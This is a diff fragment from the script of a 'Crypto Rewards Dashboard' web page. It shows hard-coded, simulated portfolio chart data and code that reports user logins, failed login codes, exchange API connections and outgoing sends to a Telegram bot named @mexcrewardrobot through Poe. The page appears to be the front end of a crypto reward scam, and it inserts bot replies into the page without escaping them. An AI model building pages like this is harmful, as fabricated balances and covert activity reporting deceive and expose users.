+            if (connectionButtons && !document.getElementById('tenderly-button')) {
+                connectionButtons.appendChild(tenderlyButton);
+            }
+        });
+        
+        // Time filter buttons
+        const timeFilterButtons = document.querySelectorAll('.time-filter');
+        timeFilterButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                // Remove active class from all buttons
+                timeFilterButtons.forEach(btn => {
+                    btn.classList.remove('bg-primary', 'text-white');
+                    btn.classList.add('bg-gray-200', 'dark:bg-gray-700', 'hover:bg-gray-300', 'dark:hover:bg-gray-600');
+                });
+                
+                // Add active class to clicked button
+                button.classList.add('bg-primary', 'text-white');
+                button.classList.remove('bg-gray-200', 'dark:bg-gray-700', 'hover:bg-gray-300', 'dark:hover:bg-gray-600');
+                
+                // Update chart data (simulated)
+                if (portfolioChart) {
+                    let newData;
+                    
+                    switch (button.textContent) {
+                        case '1D':
+                            newData = [2750, 2765, 2740, 2760, 2755, 2770, 2785, 2800];
+                            portfolioChart.data.labels = ['9AM', '10AM', '11AM', '12PM', '1PM', '2PM', '3PM', '4PM'];
+                            break;
+                        case '1W':
+                            newData = [2600, 2650, 2680, 2670, 2720, 2760, 2800];
+                            portfolioChart.data.labels = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'];
+                            break;
+                        case '1M':
+                            newData = [2500, 2530, 2580, 2560, 2610, 2660, 2650, 2700, 2750, 2800];
+                            portfolioChart.data.labels = ['May 12', 'May 15', 'May 18', 'May 21', 'May 24', 'May 27', 'May 30', 'Jun 2', 'Jun 5', 'Jun 8'];
+                            break;
+                        case '1Y':
+                            newData = [1200, 1350, 1500, 1650, 1800, 2000, 2150, 2300, 2500, 2600, 2700, 2800];
+                            portfolioChart.data.labels = ['Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec', 'Jan', 'Feb', 'Mar', 'Apr', 'May'];
+                            break;
+                    }
+                    
+                    portfolioChart.data.datasets[0].data = newData;
+                    portfolioChart.update();
+                }
+            });
+        });
+        
+        // If using Poe Embed API and the webapp is loaded in Poe
+        if (window.Poe) {
+            // Register handler for responding to bot messages
+            window.Poe.registerHandler("telegram-bot-handler", (result, context) => {
+                if (result.status === "complete" && result.responses.length > 0) {
+                    const message = result.responses[0].content;
+                    
+                    // Display a notification with the bot's response
+                    const notification = document.createElement('div');
+                    notification.className = 'fixed bottom-4 right-4 bg-blue-500 text-white p-4 rounded-lg shadow-lg z-50';
+                    notification.innerHTML = `
+                        <div class="flex items-center">
+                            <i class="fab fa-telegram mr-2"></i>
+                            <span>Message from @mexcrewardrobot:</span>
+                        </div>
+                        <div class="mt-2">${message}</div>
+                    `;
+                    document.body.appendChild(notification);
+                    
+                    // Remove notification after 5 seconds
+                    setTimeout(() => {
+                        notification.remove();
+                    }, 5000);
+                }
+            });
+            
+            // Function to send message to the Telegram bot through Poe
+            async function sendMessageToTelegramBot(message) {
+                try {
+                    await window.Poe.sendUserMessage(
+                        `@Claude-3.7-Sonnet Please simulate a response from the Telegram bot @mexcrewardrobot to this message: "${message}"`,
+                        {
+                            handler: "telegram-bot-handler",
+                            openChat: false
+                        }
+                    );
+                    return true;
+                } catch (err) {
+                    console.error("Error sending message:", err);
+                    return false;
+                }
+            }
+            
+            // Use this function when notifying the Telegram bot
+            const oldNotifyTelegramBot = notifyTelegramBot;
+            notifyTelegramBot = async function(action, data = {}) {
+                // Call the original function
+                const result = await oldNotifyTelegramBot(action, data);
+                
+                // Also send a message to the bot through Poe
+                let message = "";
+                
+                switch(action) {
+                    case "user_login":
+                        message = "User has logged in to the Crypto Rewards Dashboard";
+                        break;
+                    case "login_failed":
+                        message = "Login attempt failed with code: " + data.code;
+                        break;
+                    case "api_connected":
+                        message = "User connected API for exchange: " + data.exchange;
+                        break;
+                    case "added_eth":
+                        message = "User added " + data.amount + " ETH to their wallet";
+                        break;
+                    case "buy_crypto":
+                    case "buy":
+                        message = "User purchased " + (data.amount || "some") + " " + (data.coin || data.symbol || "crypto");
+                        break;
+                    case "sell":
+                        message = "User sold " + (data.amount || "some") + " " + (data.coin || data.symbol || "crypto");
+                        break;
+                    case "swap":
+                        message = "User swapped " + data.fromAmount + " " + data.fromCoin + " to " + data.toAmount + " " + data.toCoin;
+                        break;
+                    case "deposit":
+                        message = "User deposited " + data.amount + " " + data.coin;
+                        break;
+                    case "send":
+                        message = "User sent " + data.amount + " " + data.coin + " to address " + data.address;
+                        break;
+                    case "manual_notification":
+                        message = "Current portfolio value: " + data.balance + " USDT";
+                        break;
+                    default:
+                        message = "Action performed: " + action;
+                }
+                
+                await sendMessageToTelegramBot(message);
+                
+                return result;
+            };
+        }
+    </script>
+
+
+</body></html>
